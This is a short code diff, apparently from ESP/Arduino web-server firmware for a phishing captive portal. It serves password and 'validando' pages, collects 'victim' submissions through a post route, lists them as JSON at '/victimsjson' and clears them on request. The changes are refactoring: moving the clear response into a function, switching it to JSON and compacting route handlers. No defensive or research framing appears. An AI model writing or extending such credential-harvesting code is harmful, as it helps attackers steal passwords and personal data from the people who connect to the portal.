@@ -31,6 +31,7 @@ String input(String argName) {
 
 void clear() {
     victims->clearVictims();
+    webServer.send(200, "application/json", "{\"status\": \"OK\"}");
 }
 
 
@@ -53,6 +54,7 @@ void handleFileRequest(String path) {
     file.close();
 }
 
+// void getMemory(){}
 
 void postVictimData() {
     if (webServer.hasArg("plain")) {
@@ -86,14 +88,8 @@ void setup() {
     webServer.on("/pass", []() { handleFileRequest("/pass.html"); });
     webServer.on("/validando", []() { handleFileRequest("/validando.html"); });
 
-    webServer.on("/clear", []() {
-        clear();
-        webServer.send(200, "text/plain", "Deletado com sucesso");
-    });
-    
-    webServer.on("/post", []() {
-        postVictimData();
-    });
+    webServer.on("/clear", []() { clear(); });
+    webServer.on("/post", []() { postVictimData(); });
 
     webServer.on("/victimsjson", []() {
         webServer.send(200, "application/json", victims->getJsonText());
